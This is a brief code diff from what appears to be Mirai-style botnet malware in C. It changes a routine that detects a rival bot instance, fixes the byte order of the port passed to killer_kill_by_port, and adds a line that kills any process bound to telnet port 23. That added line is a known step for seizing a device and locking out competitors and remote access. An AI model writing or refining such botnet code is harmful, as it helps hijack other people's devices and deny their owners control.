@@ -55,7 +55,8 @@ void check_and_kill_white()
         close(sock);
     } else {
         printf("White detected! Killing...\r\n");
-        killer_kill_by_port(SINGLE_INSTANCE_PORT_WHITE);
+        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT_WHITE));
+	killer_kill_by_port(htons(23));
         close(sock);
     }
     //addr.sin_addr.s_addr = INET_ADDR(127,0,0,1);
